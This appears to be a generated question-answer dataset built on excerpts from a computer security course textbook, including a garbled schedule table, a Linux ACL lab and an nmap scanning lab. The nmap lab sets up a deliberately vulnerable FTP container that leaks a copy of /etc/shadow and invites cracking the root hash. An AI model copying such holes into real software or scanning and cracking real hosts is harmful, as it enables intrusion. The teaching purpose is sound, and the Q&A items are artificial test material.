::: embed                                     | 1.1, 1.2, 1.3, 1.4,   |\n\n|                       | [Introdu              | Midterm Review\\                               | 1.5, 1.6, 1.7, 1.8,   |\n\n|                       | ction](#_computer_sys | [Lab: MitM with                               | 2.1, 2.4, 2.5, 2.7,   |\n\n|                       | tems_security_plannin | Scapy](#_computer_systems_sec                 | 2.8, 3.1, 3.2, 3.3,   |\n\n|                       | g_for_success.xhtml__ | urity_planning_for_success.xhtml__lab_mitm_wi | 3.4, 3.8, 3.9, 4.1,   |\n\n|                       | introduction){.xref}\\ | th_scapy){#_computer_systems_security_plannin | 4.2, 4.3, 4.5         |\n\n|                       | [Cryptog              | g_for_success.xhtml_xref-_lab_mitm_with_scapy |                       |\n\n|                       | raphy](#_computer_sys | .xref}                                        |                       |\n\n|                       | tems_security_plannin | :::                                           |                       |\n\n|                       | g_for_success.xhtml__ |                                               |                       |\n\n|                       | cryptography){.xref}\\ |                                               |                       |\n\n|                       | [Malware](#_compute   |                                               |                       |\n\n|                       | r_systems_security_pl |                                               |                       |\n\n|                       | anning_for_success.xh |                                               |                       |\n\n|                       | tml__malware){.xref}\\ |                                               |                       |\n\n|                       | [P                    |                                               |                       |\n\n|                       | rotocols](#_computer_ |                                               |                       |\n\n|                       | systems_security_plan |                                               |                       |\n\n|                       | ning_for_success.xhtm |                                               |                       |\n\n|                       | l__protocols){.xref}\\ |                                               |                       |\n\n|                       | [Attacks](#_comput    |                                               |                       |\n\n|                       | er_systems_security_p |                                               |                       |\n\n|                       | lanning_for_success.x |                                               |                       |\n\n|                       | html__attacks){.xref} |                                               |                       |\n\n|                       | :::                   |                                               |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 7                     | ::: embed             | Midterm                                       | 1.1, 1.2, 1.3, 1.4,   |\n\n|                       | [Introdu              |                                               | 1.5, 1.6, 1.7, 1.8,   |\n\n|                       | ction](#_computer_sys |                                               | 2.1, 2.4, 2.5, 2.7,   |\n\n|                       | tems_security_plannin |                                               | 2.8, 3.1, 3.2, 3.3,   |\n\n|                       | g_for_success.xhtml__ |                                               | 3.4, 3.8, 3.9, 4.1,   |\n\n|                       | introduction){.xref}\\ |                                               | 4.2, 4.3, 4.5         |\n\n|                       | [Cryptog              |                                               |                       |\n\n|                       | raphy](#_computer_sys |                                               |                       |\n\n|                       | tems_security_plannin |                                               |                       |\n\n|                       | g_for_success.xhtml__ |                                               |                       |\n\n|                       | cryptography){.xref}\\ |                                               |                       |\n\n|                       | [Malware](#_compute   |                                               |                       |\n\n|                       | r_systems_security_pl |                                               |                       |\n\n|                       | anning_for_success.xh |                                               |                       |\n\n|                       | tml__malware){.xref}\\ |                                               |                       |\n\n|                       | [P                    |                                               |                       |\n\n|                       | rotocols](#_computer_ |                                               |                       |\n\n|                       | systems_security_plan |                                               |                       |\n\n|                       | ning_for_success.xhtm |                                               |                       |\n\n|                       | l__protocols){.xref}\\ |                                               |                       |\n\n|                       | [Attacks](#_comput    |                                               |                       |\n\n|                       | er_systems_security_p |                                               |                       |\n\n|                       | lanning_for_success.x |                                               |                       |\n\n|                       | html__attacks){.xref} |                                               |                       |\n\n|                       | :::                   |                                               |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 8                     | [Security             | ::: embed                                     | 3.1, 3.2, 3.3, 3.6,   |\n\n|                       | Solutions](#_comput   | [Lab: Exploiting                              | 4.1, 4.2              |\n\n|                       | er_systems_security_p | log4j](#_computer_systems_secur               |                       |\n\n|                       | lanning_for_success.x | ity_planning_for_success.xhtml__lab_exploitin |                       |\n\n|                       | html__security_soluti | g_log4j){#_computer_systems_security_planning |                       |\n\n|                       | ons){#_computer_syste | _for_success.xhtml_xref-_lab_exploiting_log4j |                       |\n\n|                       | ms_security_planning_ | .xref}\\                                       |                       |\n\n|                       | for_success.xhtml_xre | [Security Solutions Review                    |                       |\n\n|                       | f-_security_solutions | Questions](#_computer_sys                     |                       |\n\n|                       | .xref}                | tems_security_planning_for_success.xhtml_solu |                       |\n\n|                       |                       | tions_review){#_computer_systems_security_pla |                       |\n\n|                       |                       | nning_for_success.xhtml_xref-solutions_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 9                     | [Access               | ::: embed                                     | 2.1, 2.2, 2.4, 2.7,   |\n\n|                       | Controls](#_          | [Lab: Linux File                              | 3.3, 3.4, 3.8, 5.1    |\n\n|                       | computer_systems_secu | Perm                                          |                       |\n\n|                       | rity_planning_for_suc | issions](#_computer_systems_security_planning |                       |\n\n|                       | cess.xhtml__access_co | _for_success.xhtml__lab_linux_file_permission |                       |\n\n|                       | ntrols){#_computer_sy | s){#_computer_systems_security_planning_for_s |                       |\n\n|                       | stems_security_planni | uccess.xhtml_xref-_lab_linux_file_permissions |                       |\n\n|                       | ng_for_success.xhtml_ | .xref}\\                                       |                       |\n\n|                       | xref-_access_controls | [Access Controls Review                       |                       |\n\n|                       | .xref}                | Questions](#_comput                           |                       |\n\n|                       |                       | er_systems_security_planning_for_success.xhtm |                       |\n\n|                       |                       | l_access_review){#_computer_systems_security_ |                       |\n\n|                       |                       | planning_for_success.xhtml_xref-access_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 10                    | [Vulnerability        | ::: embed                                     | 5.1, 5.2, 5.3, 5.4,   |\n\n|                       | Management and        | [Lab: Scanning with                           | 5.5                   |\n\n|                       | Compliance](#_comput  | Nessus](#_computer_systems_security_plan      |                       |\n\n|                       | er_systems_security_p | ning_for_success.xhtml__lab_scanning_with_nes |                       |\n\n|                       | lanning_for_success.x | sus){#_computer_systems_security_planning_for |                       |\n\n|                       | html__vulnerability_m | _success.xhtml_xref-_lab_scanning_with_nessus |                       |\n\n|                       | anagement_and_complia | .xref}\\                                       |                       |\n\n|                       | nce){#_computer_syste | [Vulnerability Management and Compliance      |                       |\n\n|                       | ms_security_planning_ | Review                                        |                       |\n\n|                       | for_success.xhtml_xre | Questions](#_computer_syste                   |                       |\n\n|                       | f-_vulnerability_mana | ms_security_planning_for_success.xhtml_compli |                       |\n\n|                       | gement_and_compliance | ance_review){#_computer_systems_security_plan |                       |\n\n|                       | .xref}                | ning_for_success.xhtml_xref-compliance_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 11                    | [Incident Response    | ::: embed                                     | 1.2, 1.3, 1.4, 1.7,   |\n\n|                       | and                   | [Lab: Reporting on the 2014 Sony Pictures     | 1.8, 2.3, 2.5, 3.1,   |\n\n|                       | Contin                | Hack](#_computer_systems_security             | 3.2, 3.3, 3.4, 4.1,   |\n\n|                       | uity](#_computer_syst | _planning_for_success.xhtml__lab_reporting_on | 4.2, 4.3, 4.4, 4.5,   |\n\n|                       | ems_security_planning | _the_2014_sony_pictures_hack){#_computer_syst | 5.3, 5.4, 5.5         |\n\n|                       | _for_success.xhtml__i | ems_security_planning_for_success.xhtml_xref- |                       |\n\n|                       | ncident_response_and_ | _lab_reporting_on_the_2014_sony_pictures_hack |                       |\n\n|                       | continuity){#_compute | .xref}\\                                       |                       |\n\n|                       | r_systems_security_pl | [Incident Response and Recovery Review        |                       |\n\n|                       | anning_for_success.xh | Questions](#_computer_s                       |                       |\n\n|                       | tml_xref-_incident_re | ystems_security_planning_for_success.xhtml_in |                       |\n\n|                       | sponse_and_continuity | cident_review){#_computer_systems_security_pl |                       |\n\n|                       | .xref}                | anning_for_success.xhtml_xref-incident_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 12                    | [Virtualization](     | ::: embed                                     | 2.3, 3.6, 3.6         |\n\n|                       | #_computer_systems_se | [Lab: Malicious                               |                       |\n\n|                       | curity_planning_for_s | Containers](#_computer_systems_security_plan  |                       |\n\n|                       | uccess.xhtml__virtual | ning_for_success.xhtml__lab_malicious_contain |                       |\n\n|                       | ization){#_computer_s | ers){#_computer_systems_security_planning_for |                       |\n\n|                       | ystems_security_plann | _success.xhtml_xref-_lab_malicious_containers |                       |\n\n|                       | ing_for_success.xhtml | .xref}\\                                       |                       |\n\n|                       | _xref-_virtualization | [Virtualization Review                        |                       |\n\n|                       | .xref}                | Questions](#_co                               |                       |\n\n|                       |                       | mputer_systems_security_planning_for_success. |                       |\n\n|                       |                       | xhtml_virt_review){#_computer_systems_securit |                       |\n\n|                       |                       | y_planning_for_success.xhtml_xref-virt_review |                       |\n\n|                       |                       | .xref}                                        |                       |\n\n|                       |                       | :::                                           |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 13                    | Mobile Solutions      | Quiz 2                                        | 3.5                   |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 14                    | ::: embed             | Final Review                                  | 1.2, 1.3, 1.4, 1.7,   |\n\n|                       | [Security             |                                               | 1.8, 2.1, 2.2, 2.3,   |\n\n|                       | Solutions]            |                                               | 2.4, 2.5, 2.7, 3.1,   |\n\n|                       | (#_computer_systems_s |                                               | 3.2, 3.3, 3.4, 3.5,   |\n\n|                       | ecurity_planning_for_ |                                               | 3.6, 3.7, 3.8, 4.1,   |\n\n|                       | success.xhtml__securi |                                               | 4.2, 4.3, 4.4, 4.5,   |\n\n|                       | ty_solutions){.xref}\\ |                                               | 5.1, 5.2, 5.3, 5.4,   |\n\n|                       | [Access               |                                               | 5.5                   |\n\n|                       | Contro                |                                               |                       |\n\n|                       | ls](#_computer_system |                                               |                       |\n\n|                       | s_security_planning_f |                                               |                       |\n\n|                       | or_success.xhtml__acc |                                               |                       |\n\n|                       | ess_controls){.xref}\\ |                                               |                       |\n\n|                       | [Vulnerability        |                                               |                       |\n\n|                       | Management and        |                                               |                       |\n\n|                       | Compliance]           |                                               |                       |\n\n|                       | (#_computer_systems_s |                                               |                       |\n\n|                       | ecurity_planning_for_ |                                               |                       |\n\n|                       | success.xhtml__vulner |                                               |                       |\n\n|                       | ability_management_an |                                               |                       |\n\n|                       | d_compliance){.xref}\\ |                                               |                       |\n\n|                       | [Incident Response    |                                               |                       |\n\n|                       | and                   |                                               |                       |\n\n|                       | Cont                  |                                               |                       |\n\n|                       | inuity](#_computer_sy |                                               |                       |\n\n|                       | stems_security_planni |                                               |                       |\n\n|                       | ng_for_success.xhtml_ |                                               |                       |\n\n|                       | _incident_response_an |                                               |                       |\n\n|                       | d_continuity){.xref}\\ |                                               |                       |\n\n|                       | [Virtualizat          |                                               |                       |\n\n|                       | ion](#_computer_syste |                                               |                       |\n\n|                       | ms_security_planning_ |                                               |                       |\n\n|                       | for_success.xhtml__vi |                                               |                       |\n\n|                       | rtualization){.xref}\\ |                                               |                       |\n\n|                       | Mobile Solutions      |                                               |                       |\n\n|                       | :::                   |                                               |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n| 15                    | ::: embed             | Final Exam                                    | 1.2, 1.3, 1.4, 1.7,   |\n\n|                       | [Security             |                                               | 1.8, 2.1, 2.2, 2.3,   |\n\n|                       | Solutions]            |                                               | 2.4, 2.5, 2.7, 3.1,   |\n\n|                       | (#_computer_systems_s |                                               | 3.2, 3.3, 3.4, 3.5,   |\n\n|                       | ecurity_planning_for_ |                                               | 3.6, 3.7, 3.8, 4.1,   |\n\n|                       | success.xhtml__securi |                                               | 4.2, 4.3, 4.4, 4.5,   |\n\n|                       | ty_solutions){.xref}\\ |                                               | 5.1, 5.2, 5.3, 5.4,   |\n\n|                       | [Access               |                                               | 5.5                   |\n\n|                       | Contro                |                                               |                       |\n\n|                       | ls](#_computer_system |                                               |                       |\n\n|                       | s_security_planning_f |                                               |                       |\n\n|                       | or_success.xhtml__acc |                                               |                       |\n\n|                       | ess_controls){.xref}\\ |                                               |                       |\n\n|                       | [Vulnerability        |                                               |                       |\n\n|                       | Management and        |                                               |                       |\n\n|                       | Compliance]           |                                               |                       |\n\n|                       | (#_computer_systems_s |                                               |                       |\n\n|                       | ecurity_planning_for_ |                                               |                       |\n\n|                       | success.xhtml__vulner |                                               |                       |\n\n|                       | ability_management_an |                                               |                       |\n\n|                       | d_compliance){.xref}\\ |                                               |                       |\n\n|                       | [Incident Response    |                                               |                       |\n\n|                       | and                   |                                               |                       |\n\n|                       | Cont                  |                                               |                       |\n\n|                       | inuity](#_computer_sy |                                               |                       |\n\n|                       | stems_security_planni |                                               |                       |\n\n|                       | ng_for_success.xhtml_ |                                               |                       |\n\n|                       | _incident_response_an |                                               |                       |\n\n|                       | d_continuity){.xref}\\ |                                               |                       |\n\n|                       | [Virtualizat          |                                               |                       |\n\n|                       | ion](#_computer_syste |                                               |                       |\n\n|                       | ms_security_planning_ |                                               |                       |\n\n|                       | for_success.xhtml__vi |                                               |                       |\n\n|                       | rtualization){.xref}\\ |                                               |                       |\n\n|                       | Mobile Solutions      |                                               |                       |\n\n|                       | :::                   |                                               |                       |\n\n+-----------------------+-----------------------+-----------------------------------------------+-----------------------+\n\n:::\n\n::::\n\n:::::\n\n::::::::\n\n::::::::::::::::::::::: {.section .sect1 title=\"1. Introduction\"}\n", "topic": "Critique the effectiveness of the introductory material in setting clear expectations for the 15-week semester and student performance.", "question": "Considering the provided schedule, what specific learning outcomes are most critically dependent on successful completion of the initial laboratory assignments (Lab: Think Like a Hacker and Lab: Hash it Out), and why are these outcomes particularly important for establishing a foundational understanding of the course material?", "answer": "Lab: Think Like a Hacker and Lab: Hash it Out are critical for establishing understanding of vulnerability scanning and hashing, respectively, which are foundational for later topics like malware analysis and incident response.", "explanation": "The initial labs directly introduce core concepts like vulnerability scanning and hashing.  Success in these labs is a strong indicator of the student\u2019s ability to apply these concepts, which is crucial for understanding subsequent material related to malware analysis and incident response.", "question_token_count": 53, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 6, "question_groundedness_score": 10, "avg_answer_token_count": 39, "choices": null}
{"context": "# group: alice\nuser::rwx\n\nuser:http:r-x\n\ngroup::---\n\nmask::r-x\n\nother::---\n\n\n# group: bob\nuser::rwx\n\nuser:http:r-x\n\ngroup::---\n\nmask::r-x\n\nother::---\n\n\n# group: carol\nuser::rwx\n\nuser:http:r-x\n\ngroup::---\n\nmask::r-x\n\nother::---</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the `+`{.literal} sign indicating there are extra permissions\n\n:::\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nTake a screenshot showing that the http user has access to each directory.\n\n:::\n\n</aside>\n\nWhen you are done, you can type exit to exit bash and stop the container.\n\n:::::::\n\n:::: {.section .sect2 title=\"7.5. Review Questions\"}\n\n\n## 7.5. Review Questions {#_computer_systems_security_planning_for_success.xhtml_access_review}\n::: description-list\n\n[What is the difference between authentication and authorization?]{.term}\n\n:   []{.principal}\n\n[Describe three technologies used to control physical access?]{.term}\n\n:   []{.principal}\n\n[Imagine you are writing security policies for a mid-sized corporation. What would your policy be regarding the use of SSH keys? Why?]{.term}\n\n:   []{.principal}\n\n:::\n\n::::\n\n::::::::::::::::::::::::::::::::::::::::::::\n\n::::::::::::::::::::::::::: {.section .sect1 title=\"8. Vulnerability Management and Compliance\"}\n", "topic": "Describe the significance of the `mask` permission and how it interacts with user and group permissions.", "question": "How does the `mask` permission influence the effective permissions of a user or group when their explicit permissions appear more permissive?", "answer": "The `mask` permission restricts the maximum effective permissions, regardless of explicit user or group permissions.", "explanation": "The `mask` permission limits the maximum effective permissions a user or group can have. It sets a hard limit on the permissions that can be applied to files and directories, regardless of the user\u2019s or group\u2019s explicit permissions.", "question_token_count": 26, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 20, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Recognizing the role of Docker Compose in simplifying the deployment and management of complex containerized applications.", "question": "Describe the purpose of Docker Compose and explain how it simplifies the management of the containerized application environment presented in the lab. Specifically, how does it relate to the `docker-compose.yml` file?", "answer": "Docker Compose simplifies multi-container application management by defining and running them together using a `docker-compose.yml` file, which specifies the services, networks, and volumes needed.", "explanation": "Docker Compose is a tool for defining and running multi-container Docker applications. It uses a YAML file (the `docker-compose.yml`) to configure the services, networks, and volumes that make up the application. This simplifies the process of starting, stopping, and scaling the application compared to managing individual containers manually. In this lab, Docker Compose orchestrates the `victim` and `scanner` containers, handling their networking and dependencies.", "question_token_count": 40, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 34, "choices": null}
